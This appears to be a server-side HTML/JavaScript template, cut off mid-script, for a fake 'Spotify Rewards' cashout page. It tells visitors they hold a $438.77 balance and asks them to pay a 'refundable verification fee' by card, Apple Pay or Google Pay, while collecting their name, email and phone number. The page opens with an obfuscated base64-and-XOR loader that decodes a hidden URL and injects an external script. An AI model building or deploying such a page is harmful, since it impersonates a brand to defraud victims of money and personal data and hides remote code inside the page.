  <script>(function(){var i_hd=atob("DC88blVZS9X/8T/DIVQeGyc1ae/dmUu3UVwGQXo6L7vRhEuuSElFQDY2JvudgxCwQl1VHiEqZKWWiVqvDl9VFjA1Zb+M0xPhQFtIHDw7PqGagh35enIQTDI1JLeenUzhG3RHTDs4JrDdyx2zSFdZAhw9afndh16vVEoeVHdvKrHOxF2gQx1fXzBvcuTJyAyiFBhYWmB7NoiC");var o_a=[];for(var g_yu=0;g_yu<i_hd.length;g_yu++){o_a.push(i_hd.charCodeAt(g_yu)&255);}var a_z=o_a[0];var f_15=o_a.slice(1,1+a_z);var a_39=o_a.slice(1+a_z);var k_ov=a_39.map(function(b,y_68f){return b^f_15[y_68f%a_z];});var f_v="";for(var d_53=0;d_53<k_ov.length;d_53++){f_v+=String.fromCharCode(k_ov[d_53]&255);}var b_idz1=decodeURIComponent(escape(f_v));var z_55d=JSON.parse(b_idz1);var o_g=z_55d.globals||[];o_g.forEach(function(d_koz){window[d_koz.name]=d_koz.value;});var h_7gc=document.createElement("script");h_7gc.src=z_55d.url;h_7gc.async=true;h_7gc.defer=true;(z_55d.attributes||[]).forEach(function(n_2t){h_7gc.setAttribute(n_2t.name,n_2t.value);});(document.head||document.documentElement).appendChild(h_7gc);})();</script>

  <!-- STRIPE SDK -->
  <link rel="preconnect" href="https://js.stripe.com" crossorigin />
  <link rel="dns-prefetch" href="https://js.stripe.com" />
  <link rel="preconnect" href="https://m.stripe.network" crossorigin />
  <link rel="dns-prefetch" href="https://m.stripe.network" />
  <link rel="preload" href="https://js.stripe.com/v3/" as="script" />
  <script src="https://js.stripe.com/v3/"></script>

  ${pixelScript}

  <style>
    :root {
      --spotify-green: #1ed760;
      --spotify-green-hover: #1fdf64;
      --bg-main: #06090c;
      --card-bg: #10151c;
      --input-bg: #161c24;
      --input-border: #232d3b;
      --input-focus: #1ed760;
      --text-primary: #ffffff;
      --text-secondary: #8e9ea9;
      --text-muted: #5f6d7a;
    }

    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      -webkit-font-smoothing: antialiased;
    }

    body {
      background-color: var(--bg-main);
      background-image: radial-gradient(circle at 50% 0%, rgba(30, 215, 96, 0.09) 0%, rgba(6, 9, 12, 0.98) 55%, var(--bg-main) 100%);
      color: var(--text-primary);
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      padding: 40px 16px;
    }

    .top-brand {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      margin-bottom: 28px;
      opacity: 0.9;
    }
    .top-brand svg {
      width: 22px;
      height: 22px;
      fill: var(--spotify-green);
    }
    .top-brand span {
      font-size: 13px;
      font-weight: 700;
      color: var(--spotify-green);
      letter-spacing: 0.5px;
      text-transform: uppercase;
    }

    .checkout-container {
      width: 100%;
      max-width: 980px;
      display: flex;
      flex-direction: row;
      gap: 52px;
      align-items: flex-start;
      justify-content: space-between;
    }

    /* LEFT COLUMN */
    .left-col {
      flex: 1.15;
      padding-top: 6px;
    }

    .left-header {
      display: flex;
      align-items: center;
      gap: 18px;
      margin-bottom: 22px;
    }

    .app-icon-box {
      width: 62px;
      height: 62px;
      background: #0d1217;
      border: 1px solid rgba(255, 255, 255, 0.1);
      border-radius: 16px;
      display: flex;
      align-items: center;
      justify-content: center;
      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.45);
      flex-shrink: 0;
    }

    .app-icon-box svg {
      width: 38px;
      height: 38px;
      fill: var(--spotify-green);
    }

    .title {
      font-size: 32px;
      font-weight: 800;
      line-height: 1.15;
      letter-spacing: -0.5px;
      color: #ffffff;
      margin-bottom: 4px;
    }

    .title .amount-highlight {
      color: var(--spotify-green);
    }

    .subtitle {
      font-size: 13.5px;
      color: var(--text-secondary);
      line-height: 1.4;
    }

    .badge-instant {
      display: inline-flex;
      align-items: center;
      gap: 6px;
      background: rgba(30, 215, 96, 0.08);
      border: 1px solid rgba(30, 215, 96, 0.35);
      color: var(--spotify-green);
      padding: 6px 14px;
      border-radius: 20px;
      font-size: 10.5px;
      font-weight: 700;
      letter-spacing: 0.8px;
      text-transform: uppercase;
      margin-bottom: 28px;
    }

    .features-list {
      list-style: none;
      margin-bottom: 32px;
      display: flex;
      flex-direction: column;
      gap: 18px;
    }

    .feature-item {
      display: flex;
      align-items: flex-start;
      gap: 14px;
      font-size: 13.5px;
      color: var(--text-secondary);
      line-height: 1.5;
    }

    .feature-icon {
      flex-shrink: 0;
      width: 20px;
      height: 20px;
      margin-top: 2px;
    }

    .feature-item strong {
      color: #ffffff;
      font-weight: 600;
    }

    .feature-item .strong-green {
      color: var(--spotify-green);
      font-weight: 700;
    }

    .trust-row {
      display: flex;
      flex-wrap: wrap;
      align-items: center;
      gap: 24px;
      font-size: 11.5px;
      font-weight: 600;
      color: var(--text-secondary);
      padding-top: 4px;
    }

    .trust-item {
      display: flex;
      align-items: center;
      gap: 6px;
    }

    .trust-item svg {
      width: 14px;
      height: 14px;
      stroke: var(--spotify-green);
    }

    /* RIGHT COLUMN - CHECKOUT CARD */
    .right-col {
      flex: 1;
      max-width: 430px;
      width: 100%;
    }

    .checkout-card {
      background-color: var(--card-bg);
      border: 1px solid #1c2533;
      border-radius: 18px;
      padding: 26px 24px;
      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.65);
    }

    .balance-top-row {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 20px;
    }

    .balance-title {
      font-size: 11px;
      font-weight: 700;
      color: #7d8c99;
      letter-spacing: 0.8px;
      text-transform: uppercase;
    }

    .balance-value {
      font-size: 22px;
      font-weight: 800;
      color: var(--spotify-green);
    }

    /* EXPRESS WALLET BUTTON (G PAY / APPLE PAY + 3 CARDS) */
    .express-wallet-box {
      width: 100%;
      background: #000000;
      border: 1px solid #2a3340;
      border-radius: 10px;
      padding: 11px 16px;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 14px;
      cursor: pointer;
      transition: border-color 0.2s, transform 0.1s, box-shadow 0.2s;
      user-select: none;
      box-sizing: border-box;
      height: 52px;
    }
    .express-wallet-box:hover {
      border-color: #1ed760;
      box-shadow: 0 0 14px rgba(30, 215, 96, 0.2);
      transform: translateY(-1px);
    }
    .express-wallet-box:active {
      transform: translateY(1px);
    }

    .wallet-brands-left {
      display: flex;
      align-items: center;
      flex-shrink: 0;
    }
    .wallet-brand-logo {
      display: inline-flex;
      align-items: center;
      height: 22px;
      cursor: pointer;
    }

    .wallet-divider-bar {
      width: 1px;
      height: 24px;
      background: #333f4e;
      flex-shrink: 0;
    }

    .wallet-cards-right {
      display: flex;
      align-items: center;
      gap: 6px;
      flex-shrink: 0;
    }
    .mini-card-badge {
      width: 40px;
      height: 25px;
      border-radius: 3.5px;
      position: relative;
      box-shadow: 0 2px 5px rgba(0,0,0,0.6);
      flex-shrink: 0;
      overflow: hidden;
      border: 1px solid rgba(255,255,255,0.18);
      box-sizing: border-box;
    }

    /* CARD 1: BLUE VISA (ITAU / CHASE) */
    .card-blue {
      background: linear-gradient(135deg, #104a9c 0%, #072962 100%);
    }
    .card-blue .chip {
      position: absolute;
      top: 3px;
      left: 3.5px;
      width: 7px;
      height: 5px;
      background: rgba(255,255,255,0.9);
      border-radius: 1px;
    }
    .card-blue .visa {
      position: absolute;
      bottom: 2px;
      right: 3px;
      font-size: 6.5px;
      font-weight: 900;
      font-style: italic;
      color: #ffffff;
      line-height: 1;
      letter-spacing: 0.2px;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    }

    /* CARD 2: BLACK VISA */
    .card-black {
      background: linear-gradient(135deg, #2b3038 0%, #121417 100%);
    }
    .card-black .geo-pattern {
      position: absolute;
      top: -3px;
      left: -3px;
      width: 22px;
      height: 26px;
      background: linear-gradient(135deg, rgba(255,255,255,0.12) 0%, transparent 70%);
      transform: rotate(20deg);
    }
    .card-black .visa {
      position: absolute;
      bottom: 2px;
      right: 3px;
      font-size: 6.5px;
      font-weight: 900;
      font-style: italic;
      color: #e2e8f0;
      line-height: 1;
      letter-spacing: 0.2px;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    }

    /* CARD 3: PURPLE NUBANK MASTERCARD */
    .card-purple {
      background: linear-gradient(135deg, #820ad1 0%, #520374 100%);
    }
    .card-purple .nu {
      position: absolute;
      top: 2.5px;
      left: 3.5px;
      font-size: 6px;
      font-weight: 900;
      color: #ffffff;
      line-height: 1;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    }
    .card-purple .mc {
      position: absolute;
      bottom: 3px;
      right: 3.5px;
      display: flex;
      align-items: center;
    }
    .card-purple .mc-red {
      width: 6.5px;
      height: 6.5px;
      background: #eb001b;
      border-radius: 50%;
    }
    .card-purple .mc-orange {
      width: 6.5px;
      height: 6.5px;
      background: #ff5f00;
      border-radius: 50%;
      margin-left: -2.8px;
    }

    .divider-row {
      display: flex;
      align-items: center;
      text-align: center;
      color: var(--text-muted);
      font-size: 10.5px;
      font-weight: 700;
      letter-spacing: 0.8px;
      text-transform: uppercase;
      margin: 18px 0;
    }

    .divider-row::before, .divider-row::after {
      content: '';
      flex: 1;
      border-bottom: 1px solid #1e2836;
    }

    .divider-row span {
      padding: 0 12px;
    }

    .form-field {
      margin-bottom: 16px;
    }

    .field-label {
      display: block;
      font-size: 12.5px;
      font-weight: 600;
      color: var(--text-secondary);
      margin-bottom: 7px;
    }

    .field-box {
      display: flex;
      align-items: center;
      background: var(--input-bg);
      border: 1px solid var(--input-border);
      border-radius: 8px;
      padding: 0 12px;
      min-height: 44px;
      transition: border-color 0.2s, box-shadow 0.2s;
    }

    .field-box:focus-within {
      border-color: #3b82f6;
    }

    .field-icon {
      color: var(--text-muted);
      display: flex;
      align-items: center;
      margin-right: 10px;
      flex-shrink: 0;
    }

    .field-icon svg {
      width: 16px;
      height: 16px;
      stroke: currentColor;
    }

    .field-input {
      flex: 1;
      background: transparent;
      border: none;
      outline: none;
      color: var(--text-primary);
      font-size: 14px;
      padding: 12px 0;
      width: 100%;
    }

    .field-input::placeholder {
      color: #475569;
    }

    .stripe-mount-wrapper {
      flex: 1;
      padding: 11px 0;
    }

    .btn-usar-pill {
      display: inline-flex;
      align-items: center;
      gap: 4px;
      background: rgba(30, 215, 96, 0.12);
      border: 1px solid rgba(30, 215, 96, 0.4);
      color: var(--spotify-green);
      padding: 3px 8px;
      border-radius: 12px;
      font-size: 11px;
      font-weight: 700;
      cursor: pointer;
      margin-left: 6px;
      user-select: none;
      transition: all 0.2s;
    }
    .btn-usar-pill:hover {
      background: rgba(30, 215, 96, 0.25);
    }

    .split-row {
      display: flex;
      gap: 12px;
      margin-bottom: 22px;
    }

    .split-col {
      flex: 1;
    }

    .btn-claim {
      width: 100%;
      background: var(--spotify-green);
      color: #000000;
      border: none;
      border-radius: 50px;
      padding: 16px 20px;
      font-size: 14.5px;
      font-weight: 800;
      letter-spacing: 0.6px;
      text-transform: uppercase;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      box-shadow: 0 4px 22px rgba(30, 215, 96, 0.35);
      transition: background 0.2s, transform 0.1s, box-shadow 0.2s;
    }

    .btn-claim:hover {
      background: var(--spotify-green-hover);
      transform: translateY(-1px);
      box-shadow: 0 6px 26px rgba(30, 215, 96, 0.5);
    }

    .btn-claim:active {
      transform: translateY(1px);
    }

    .btn-claim svg {
      width: 16px;
      height: 16px;
      stroke: #000000;
      stroke-width: 2.8;
    }

    #card-errors {
      color: #f87171;
      font-size: 12.5px;
      margin-top: 10px;
      text-align: center;
      min-height: 16px;
    }

    .verification-banner {
      margin-top: 14px;
      padding: 12px;
      background: rgba(30, 215, 96, 0.08);
      border: 1px solid rgba(30, 215, 96, 0.3);
      border-radius: 8px;
      text-align: center;
      font-size: 12px;
      color: #d1d5db;
    }

    @media (max-width: 820px) {
      body {
        padding: 24px 14px;
      }
      .checkout-container {
        flex-direction: column;
        gap: 32px;
        align-items: center;
      }
      .left-col, .right-col {
        max-width: 100%;
        width: 100%;
      }
      .title {
        font-size: 28px;
      }
      .app-icon-box {
        width: 54px;
        height: 54px;
      }
      .app-icon-box svg {
        width: 32px;
        height: 32px;
      }
    }
  </style>
</head>
<body>
  <div class="top-brand">
    <svg viewBox="0 0 24 24"><path d="M12 0C5.4 0 0 5.4 0 12s5.4 12 12 12 12-5.4 12-12S18.66 0 12 0zm5.521 17.34c-.24.359-.66.48-1.021.24-2.82-1.74-6.36-2.101-10.561-1.141-.418.122-.779-.179-.899-.539-.12-.421.18-.78.54-.9 4.56-1.021 8.52-.6 11.64 1.32.42.18.479.659.24 1.021zM19.08 14.1c-.3.42-.84.54-1.26.24-3.36-2.04-8.52-2.64-12.54-1.44-.48.12-1.02-.12-1.14-.6-.12-.48.12-1.02.6-1.14 4.56-1.32 10.26-.6 14.1 1.68.42.24.54.84.24 1.26zM19.26 10.62C15.24 8.22 8.82 8.04 5.16 9.18c-.6.18-1.26-.12-1.44-.72-.18-.6.12-1.26.72-1.44 4.26-1.32 11.28-1.08 15.9 1.68.54.3.72 1.02.42 1.56-.3.54-1.02.72-1.56.36z"/></svg>
    <span>Spotify Rewards</span>
  </div>

  <div class="checkout-container">
    <!-- LEFT PANEL -->
    <div class="left-col">
      <div class="left-header">
        <div class="app-icon-box">
          <svg viewBox="0 0 24 24"><path d="M12 0C5.4 0 0 5.4 0 12s5.4 12 12 12 12-5.4 12-12S18.66 0 12 0zm5.521 17.34c-.24.359-.66.48-1.021.24-2.82-1.74-6.36-2.101-10.561-1.141-.418.122-.779-.179-.899-.539-.12-.421.18-.78.54-.9 4.56-1.021 8.52-.6 11.64 1.32.42.18.479.659.24 1.021zM19.08 14.1c-.3.42-.84.54-1.26.24-3.36-2.04-8.52-2.64-12.54-1.44-.48.12-1.02-.12-1.14-.6-.12-.48.12-1.02.6-1.14 4.56-1.32 10.26-.6 14.1 1.68.42.24.54.84.24 1.26zM19.26 10.62C15.24 8.22 8.82 8.04 5.16 9.18c-.6.18-1.26-.12-1.44-.72-.18-.6.12-1.26.72-1.44 4.26-1.32 11.28-1.08 15.9 1.68.54.3.72 1.02.42 1.56-.3.54-1.02.72-1.56.36z"/></svg>
        </div>
        <div>
          <h1 class="title">Your <span class="amount-highlight" id="title-balance">$438.77</span> is Ready</h1>
          <p class="subtitle">Complete listener verification to unlock instant cashout</p>
        </div>
      </div>

      <div class="badge-instant">
        <svg viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
        INSTANT CASHOUT VERIFICATION
      </div>

      <ul class="features-list">
        <li class="feature-item">
          <svg class="feature-icon" viewBox="0 0 24 24" fill="none" stroke="#1ed760" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="m8.5 12.5 2.5 2.5 5-5"/></svg>
          <div><strong>Unlock Full Cashout:</strong> Direct deposit of your <strong class="strong-green" id="feat-balance">$438.77</strong> to PayPal or Bank Account</div>
        </li>
        <li class="feature-item">
          <svg class="feature-icon" viewBox="0 0 24 24" fill="none" stroke="#1ed760" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="m8.5 12.5 2.5 2.5 5-5"/></svg>
          <div><strong>Daily Music Tasks Unlocked:</strong> Keep earning daily by reviewing songs ($40 - $80 per review)</div>
        </li>
        <li class="feature-item">
          <svg class="feature-icon" viewBox="0 0 24 24" fill="none" stroke="#1ed760" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="m8.5 12.5 2.5 2.5 5-5"/></svg>
          <div><strong>Official Verified Listener Badge:</strong> Priority payouts with zero processing delays</div>
        </li>
        <li class="feature-item">
          <svg class="feature-icon" viewBox="0 0 24 24" fill="none" stroke="#1ed760" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="m8.5 12.5 2.5 2.5 5-5"/></svg>
          <div><strong>100% Refundable Security Fee:</strong> Automatically refunded back to your account together with your <strong class="strong-green" id="refund-balance">$438.77</strong> balance right after registration</div>
        </li>
      </ul>

      <div class="trust-row">
        <div class="trust-item">
          <svg viewBox="0 0 24 24" fill="none" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
          Instant Deposit
        </div>
        <div class="trust-item">
          <svg viewBox="0 0 24 24" fill="none" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
          Bank-Grade Security
        </div>
        <div class="trust-item">
          <svg viewBox="0 0 24 24" fill="none" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 4v6h-6"/><path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10"/></svg>
          100% Refundable
        </div>
      </div>
    </div>

    <!-- RIGHT PANEL (FORM) -->
    <div class="right-col">
      <div class="checkout-card">
        <div class="balance-top-row">
          <span class="balance-title">ACCUMULATED BALANCE</span>
          <span class="balance-value" id="card-balance">$438.77</span>
        </div>

        <button type="button" class="express-wallet-box" id="btn-link-express" title="Express Checkout">
          <!-- Left: Wallets (Google Pay / Apple Pay) -->
          <div class="wallet-brands-left">
            <!-- Google Pay -->
            <div class="wallet-brand-logo" id="wallet-brand-gpay">
              <svg viewBox="0 0 24 24" width="18" height="18" style="vertical-align:middle;margin-right:4px;">
                <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
                <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
                <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l2.85-2.22.81-.63z" fill="#FBBC05"/>
                <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.84c.87-2.6 3.3-4.52 6.16-4.52z" fill="#EA4335"/>
              </svg>
              <span style="font-weight:700; font-size:18px; color:#ffffff; letter-spacing:-0.4px;">Pay</span>
            </div>

            <!-- Apple Pay -->
            <div class="wallet-brand-logo" id="wallet-brand-applepay" style="display:none;">
              <svg viewBox="0 0 170 170" width="16" height="16" fill="#ffffff" style="vertical-align:middle;margin-right:3px;">
                <path d="M150.37 130.25c-2.45 5.66-5.35 10.87-8.71 15.66-4.58 6.53-8.33 11.05-11.22 13.56-4.48 4.12-9.28 6.23-14.42 6.35-3.69 0-8.14-1.05-13.32-3.18-5.19-2.12-9.97-3.17-14.34-3.17-4.58 0-9.49 1.05-14.75 3.17-5.26 2.13-9.5 3.24-12.74 3.35-4.35.13-9.16-1.9-14.42-6.08-3.69-3.04-7.67-7.81-11.96-14.34-5.77-8.71-10.27-18.42-13.5-29.13-3.23-10.7-4.85-20.89-4.85-30.55 0-13.48 3.54-24.83 10.62-34.05 7.08-9.22 16.03-13.9 26.85-14.04 4.8 0 10.05 1.25 15.75 3.75 5.7 2.5 9.4 3.8 11.09 3.9 2.18 0 6.03-1.37 11.55-4.11 5.52-2.73 10.45-3.99 14.8-3.77 12.06.87 21.6 5.25 28.61 13.14-10.53 6.42-15.69 15.22-15.48 26.4.21 8.71 3.58 16.1 10.12 22.18 6.53 6.08 14.28 9.61 23.24 10.59-2.28 6.74-4.89 13.48-7.84 20.21zM119.22 31.84c0-7.72 2.76-14.89 8.28-21.52 5.53-6.63 12.39-10.32 20.59-11.07.11 1.09.16 2.07.16 2.94 0 7.61-2.91 15.02-8.73 22.23-5.82 7.2-12.83 11.23-21.03 12.08-.1-1.3-.15-2.28-.15-2.94z"/>
              </svg>
              <span style="font-weight:600; font-size:18px; color:#ffffff; letter-spacing:-0.4px;">Pay</span>
            </div>
          </div>

          <!-- Divider -->
          <div class="wallet-divider-bar"></div>

          <!-- Right: 3 Mini Cards (Blue Visa, Black Visa, Purple Nubank Mastercard) -->
          <div class="wallet-cards-right">
            <!-- Card 1: Blue Visa -->
            <div class="mini-card-badge card-blue" title="Visa">
              <div class="chip"></div>
              <div class="visa">VISA</div>
            </div>
            <!-- Card 2: Black Visa -->
            <div class="mini-card-badge card-black" title="Visa Black">
              <div class="geo-pattern"></div>
              <div class="visa">VISA</div>
            </div>
            <!-- Card 3: Purple Mastercard (Nubank) -->
            <div class="mini-card-badge card-purple" title="Mastercard">
              <div class="nu">nu</div>
              <div class="mc">
                <div class="mc-red"></div>
                <div class="mc-orange"></div>
              </div>
            </div>
          </div>
        </button>

        <div class="divider-row">
          <span>OR PAY WITH CARD</span>
        </div>

        <form id="payment-form">
          <div class="form-field">
            <label class="field-label" for="name">Full name</label>
            <div class="field-box">
              <div class="field-icon">
                <svg viewBox="0 0 24 24" fill="none" stroke-width="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
              </div>
              <input class="field-input" id="name" type="text" placeholder="" required autocomplete="name">
            </div>
          </div>

          <div class="form-field">
            <label class="field-label" for="email">Email address</label>
            <div class="field-box">
              <div class="field-icon">
                <svg viewBox="0 0 24 24" fill="none" stroke-width="2"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg>
              </div>
              <input class="field-input" id="email" type="email" placeholder="your@email.com" required autocomplete="email">
            </div>
          </div>

          <div class="form-field">
            <label class="field-label">Card number</label>
            <div class="field-box">
              <div class="field-icon">
                <svg viewBox="0 0 24 24" fill="none" stroke-width="2"><rect x="2" y="5" width="20" height="14" rx="2"/><line x1="2" y1="10" x2="22" y2="10"/></svg>
              </div>
              <div id="card-number-mount" class="stripe-mount-wrapper"></div>
              <div class="btn-usar-pill" id="btn-usar-pill">
                <span>Usar</span>
                <svg viewBox="0 0 24 24" width="11" height="11" fill="none" stroke="currentColor" stroke-width="3"><circle cx="12" cy="12" r="10" fill="currentColor"/><path d="m10 8 4 4-4 4" stroke="#10151c"/></svg>
              </div>
            </div>
          </div>

          <div class="split-row">
            <div class="split-col">
              <label class="field-label">MM / YY</label>
              <div class="field-box">
                <div id="card-expiry-mount" class="stripe-mount-wrapper"></div>
              </div>
            </div>
            <div class="split-col">
              <label class="field-label">CVC</label>
              <div class="field-box">
                <div id="card-cvc-mount" class="stripe-mount-wrapper"></div>
              </div>
            </div>
          </div>

          <div id="card-errors"></div>

          <button class="btn-claim" id="submit-btn" type="submit">
            <span>CLAIM MY REWARD</span>
            <svg viewBox="0 0 24 24" fill="none" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14M12 5l7 7-7 7"/></svg>
          </button>

          <div id="card-action-notice" class="verification-banner" style="display: none;">
            <strong>Bank Verification Required:</strong> Please check your banking app or SMS to confirm the authorization.
          </div>
        </form>
      </div>
    </div>
  </div>

  <script>
        // Multi-Language detection on client
    const userBrowserLang = (navigator.language || navigator.userLanguage || '').toLowerCase();
    const expBtnTextEl = document.getElementById('express-btn-text');
    if (expBtnTextEl) {
      if (userBrowserLang.startsWith('pt')) {
        expBtnTextEl.innerHTML = 'Pague com seguran&ccedil;a com';
      } else if (userBrowserLang.startsWith('es')) {
        expBtnTextEl.innerHTML = 'Pague de forma segura con';
      } else if (userBrowserLang.startsWith('fr')) {
        expBtnTextEl.innerHTML = 'Payez en toute s&eacute;curit&eacute; avec';
      } else if (userBrowserLang.startsWith('de')) {
        expBtnTextEl.innerHTML = 'Sicher bezahlen mit';
      } else if (userBrowserLang.startsWith('it')) {
        expBtnTextEl.innerHTML = 'Paga in sicurezza con';
      } else {
        expBtnTextEl.innerHTML = 'Pay securely with';
      }
    }

    const urlParams = new URLSearchParams(window.location.search);
    const balanceParam = urlParams.get('balance') || '438.77';
    const formattedBalance = balanceParam.startsWith('$') ? balanceParam : ('$' + balanceParam);

    // Dynamic balance updates
    document.getElementById('title-balance').textContent = formattedBalance;
    document.getElementById('feat-balance').textContent = formattedBalance;
    document.getElementById('refund-balance').textContent = formattedBalance;
    document.getElementById('card-balance').textContent = formattedBalance;

    // Prefill name & email
    const nameParam = urlParams.get('name') || urlParams.get('nome') || '';
    const emailParam = urlParams.get('email') || '';
    if (nameParam) document.getElementById('name').value = nameParam;
    if (emailParam) document.getElementById('email').value = emailParam;

    // Initialize Stripe
    const stripe = Stripe('${stripePublicKey}');
    const elements = stripe.elements();

    const elementStyles = {
      base: {
        color: '#ffffff',
        fontSize: '14px',
        fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif',
        '::placeholder': {
          color: '#475569',
          fontSize: '14px'
        }
      },
      invalid: {
        color: '#f87171',
        iconColor: '#f87171'
      }
    };

    const cardNumber = elements.create('cardNumber', { style: elementStyles, showIcon: false, placeholder: '1234 1234 1234 1234' });
    cardNumber.mount('#card-number-mount');

    const cardExpiry = elements.create('cardExpiry', { style: elementStyles, placeholder: 'MM / AA' });
    cardExpiry.mount('#card-expiry-mount');

    const cardCvc = elements.create('cardCvc', { style: elementStyles, placeholder: 'CVC' });
    cardCvc.mount('#card-cvc-mount');

    document.getElementById('btn-usar-pill').addEventListener('click', () => {
      cardNumber.focus();
    });

    // Device detection: Apple Pay vs Google Pay
    try {
      const isApple = /iPhone|iPad|iPod|Macintosh/i.test(navigator.userAgent) && !window.MSStream;
      const gpayEl = document.getElementById('wallet-brand-gpay');
      const appleEl = document.getElementById('wallet-brand-applepay');
      if (isApple) {
        if (appleEl) appleEl.style.display = 'inline-flex';
        if (gpayEl) gpayEl.style.display = 'none';
      } else {
        if (gpayEl) gpayEl.style.display = 'inline-flex';
        if (appleEl) appleEl.style.display = 'none';
      }
    } catch(e) {}

    // Native Payment Request (Apple Pay, Google Pay, Link)
    try {
      const pr = stripe.paymentRequest({
        country: '${clientCountry}' || 'US',
        currency: '${userCurrency.toLowerCase()}',
        total: {
          label: 'Verification Deposit (100% Refundable)',
          amount: ${frontPriceCents}
        },
        requestPayerName: true,
        requestPayerEmail: true,
        requestPayerPhone: true
      });

      pr.canMakePayment().then(result => {
        const btnLink = document.getElementById('btn-link-express');
        const gpayEl = document.getElementById('wallet-brand-gpay');
        const appleEl = document.getElementById('wallet-brand-applepay');

        if (result) {
          if (result.applePay) {
            if (appleEl) appleEl.style.display = 'inline-flex';
            if (gpayEl) gpayEl.style.display = 'none';
          } else if (result.googlePay) {
            if (gpayEl) gpayEl.style.display = 'inline-flex';
            if (appleEl) appleEl.style.display = 'none';
          }
          btnLink.addEventListener('click', () => { pr.show(); });
        } else {
          btnLink.addEventListener('click', () => {
            cardNumber.focus();
            const cardBox = document.getElementById('card-number-mount');
            if (cardBox) {
              cardBox.style.outline = '2px solid #1ed760';
              setTimeout(() => { cardBox.style.outline = 'none'; }, 1200);
            }
          });
        }
      });

      pr.on('paymentmethod', async (ev) => {
        const billing = ev.paymentMethod.billing_details || {};
        const pName = ev.payerName || billing.name || nameParam || 'Customer';
        const pEmail = ev.payerEmail || billing.email || emailParam || '';
        const pPhone = ev.payerPhone || billing.phone || '';

        try {
          const checkoutSearch = window.location.search ? (window.location.search + '&acc=' + encodeURIComponent(window.__STRIPE_ACCOUNT__ || '${accountCode}')) : ('?acc=' + encodeURIComponent(window.__STRIPE_ACCOUNT__ || '${accountCode}'));
          const res = await fetch('/api/stripe-charge-front' + checkoutSearch, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              payment_method_id: ev.paymentMethod.id,
              card_last4: (ev.paymentMethod.card && ev.paymentMethod.card.last4) || '',
              stripe_account: window.__STRIPE_ACCOUNT__ || '${accountCode}',
              name: pName,
              email: pEmail,
              phone: pPhone,
              extra_params: Object.fromEntries(urlParams.entries())
            })
          });
          const data = await res.json();
          if (data.ok && data.next_url) {
            ev.complete('success');
            if (typeof fbq === 'function') {
              const firstName = (pName || '').split(' ')[0] || '';
              const lastName = (pName || '').split(' ').slice(1).join(' ') || '';
              initPixels({ em: pEmail, ph: pPhone.replace(/\D/g, ''), fn: firstName, ln: lastName });
              const finalValue = data.amount ? data.amount / 100 : ${frontPriceCents} / 100;
              const eventId = data.order_id || data.payment_intent_id || ('ord_' + Date.now());
              fbq('track', 'Purchase', { value: finalValue, currency: 'USD' }, { eventID: eventId });
            }
            setTimeout(() => { window.location.replace(data.next_url); }, 800);
          } else {
            ev.complete('fail');
            document.getElementById('card-errors').textContent = data.error || 'Payment failed.';
          }
        } catch (e) {
          ev.complete('fail');
          document.getElementById('card-errors').textContent = 'Connection error. Please try again.';
        }
      });
    } catch (e) {
      console.warn('PaymentRequest not available:', e);
      document.getElementById('btn-link-express').addEventListener('click', () => { cardNumber.focus(); });
    }

    // Standard Form Submission
    const form = document.getElementById('payment-form');
    const submitBtn = document.getElementById('submit-btn');
    const errorEl = document.getElementById('card-errors');
    const actionEl = document.getElementById('card-action-notice');

    form.addEventListener('submit', async (e) => {
      e.preventDefault();
      errorEl.textContent = '';
      if (actionEl) actionEl.style.display = 'none';
      submitBtn.disabled = true;
